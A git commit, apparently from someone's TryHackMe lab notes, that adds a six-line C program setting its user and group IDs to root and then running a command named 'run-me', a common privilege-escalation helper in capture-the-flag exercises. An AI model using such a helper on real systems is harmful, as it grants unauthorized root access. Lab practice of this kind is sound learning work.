df2cef6bf9f374b373c0cf3fd0f448f6ace33195
Rebekah <macrosystem@proton.me>
2024-10-11 08:06:10 +0200

    Create run-as-root.c

---
+++ tryhackme/123-tool-box/run-as-root.c
@@ -0,0 +1,6 @@
+#include <unistd.h> // Include the header for setuid() and setgid()
+void main() {
+    setuid(0); // Set the user ID to 0 (root)
+    setgid(0); // Set the group ID to 0 (root)
+    system("run-me"); // Execute the "run-me" command
+}
